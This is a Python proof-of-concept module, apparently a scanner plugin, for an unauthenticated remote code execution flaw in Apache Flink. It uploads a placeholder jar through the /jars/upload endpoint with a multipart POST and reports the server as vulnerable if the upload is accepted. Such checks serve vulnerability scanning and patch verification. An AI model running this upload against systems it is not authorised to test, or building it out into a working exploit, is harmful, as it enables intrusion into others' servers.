import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''Apache Flink Unauth RCE''',
        "description": '''''',
        "severity": "critical",
        "references": [
            "https://www.exploit-db.com/exploits/48978", 
            "https://adamc95.medium.com/apache-flink-1-9-x-part-1-set-up-5d85fd2770f3", 
            "https://github.com/LandGrey/flink-unauth-rce"
        ],
        "classification": {
            "cvss-metrics": "",
            "cvss-score": "",
            "cve-id": "",
            "cwe-id": ""
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["apache", "flink", "rce", "intrusive", "unauth"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        path = """/jars/upload"""
        method = "POST"
        data = """--8ce4b16b22b58894aa86c421e8759df3
Content-Disposition: form-data; name="jarfile";filename="poc.jar"
Content-Type:application/octet-stream

  {{randstr}}
--8ce4b16b22b58894aa86c421e8759df3--"""
        headers = {'Content-Type': 'multipart/form-data;boundary=8ce4b16b22b58894aa86c421e8759df3'}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if ("""application/json""" in str(resp0.headers)) and ("""success""" in resp0.text and """_poc.jar""" in resp0.text) and (resp0.status_code == 200):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url